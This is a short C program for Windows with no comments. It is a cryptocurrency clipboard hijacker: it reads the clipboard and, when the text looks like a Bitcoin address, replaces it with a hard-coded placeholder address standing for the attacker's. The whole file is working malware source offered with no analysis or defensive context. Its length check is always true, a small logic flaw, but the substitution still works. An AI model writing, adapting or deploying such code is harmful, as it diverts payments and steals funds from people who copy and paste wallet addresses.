#include <Windows.h>
#include <stdio.h>

char m_szNewAddr[] = "NEW_BTC_ADDR_HERE";

int main()
{
	if (!OpenClipboard(NULL))
		return 0;

	const HANDLE hClipData = GetClipboardData(CF_TEXT);
	if (hClipData != NULL)
	{
		const char* cClipData = (const char*)GlobalLock(hClipData);
		if (cClipData != NULL)
		{
			if (strcmp(cClipData, m_szNewAddr))
			{
				int iClipLength = strlen(cClipData);

				if (iClipLength <= 34 || iClipLength >= 26)
				{
					if (cClipData[0] == '1' ||
						cClipData[0] == '3')
					{
						HANDLE hData;
						char *ptrData = NULL;

						int iLen = strlen(m_szNewAddr);
						hData = GlobalAlloc(GMEM_MOVEABLE | GMEM_DDESHARE, iLen + 1);

						ptrData = (char*)GlobalLock(hData);
						memcpy(ptrData, m_szNewAddr, iLen + 1);

						GlobalUnlock(hData);
						EmptyClipboard();

						SetClipboardData(CF_TEXT, hData);
					}
				}
			}
		}
		GlobalUnlock(hClipData);
	}
	CloseClipboard();
	return 0;
}

